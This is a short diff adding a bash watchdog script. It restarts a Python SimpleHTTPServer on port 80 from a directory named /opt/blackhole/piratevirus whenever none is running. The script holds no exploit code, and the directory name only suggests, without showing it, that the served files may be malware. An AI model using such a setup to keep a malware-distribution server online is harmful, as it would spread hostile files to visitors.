@@ -1,0 +1,6 @@
+#!/bin/bash
+SIMPLE=$(ps -ef | grep SimpleHTTPServer | grep -v grep | wc -l)
+if [[ "$SIMPLE" < "1" ]] ; then
+	cd /opt/blackhole/piratevirus
+	python -m SimpleHTTPServer 80 &
+fi
